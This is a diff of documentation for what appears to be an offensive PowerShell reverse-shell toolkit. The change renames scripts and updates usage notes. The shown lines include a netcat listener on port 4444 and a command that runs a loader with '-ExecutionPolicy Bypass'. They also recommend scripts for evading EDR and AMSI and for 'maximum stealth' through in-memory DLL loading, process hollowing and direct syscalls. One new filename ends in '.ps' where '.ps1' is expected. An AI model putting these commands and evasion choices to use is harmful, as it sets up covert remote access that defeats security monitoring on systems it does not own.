@@ -209,7 +209,7 @@ nc  -nlvp  4444
 
 cd scripts
 
-.\reverse_shell_dll_memory_edr_bypass.ps1
+.\reverse_shell_inmemory_dll_loader.ps
 
 ```
 
@@ -228,11 +228,11 @@ cd scripts
 
   
 
-**EDR/AMSI protection:** Use `reverse_shell_dll_memory_edr_bypass.ps1`
+**EDR/AMSI protection:** Use `reverse_shell_inmemory_dll_loader.ps`
 
   
 
-**Maximum stealth required:** Use `reverse_shell_process_hollowing_syscallsv2.ps1`
+**Maximum stealth required:** Use `reverse_shell_inmemory_syscall_loader_advanced.ps1`
 
   
 
@@ -244,7 +244,7 @@ cd scripts
 
   
 
-**Script closes immediately:** Use `reverse_shell_dll_memory.ps1` or `reverse_shell_dll_memory_edr_bypass.ps1` for better stability
+**Script closes immediately:** Use `reverse_shell_dll_memory.ps1` or `reverse_shell_inmemory_dll_loader.ps` for better stability
 
   
 
@@ -256,7 +256,7 @@ cd scripts
 
 ```powershell
 
-powershell.exe  -ExecutionPolicy Bypass -File .\reverse_shell_dll_memory_edr_bypass.ps1
+powershell.exe  -ExecutionPolicy Bypass -File .\reverse_shell_inmemory_dll_loader.ps
 
 ```
 
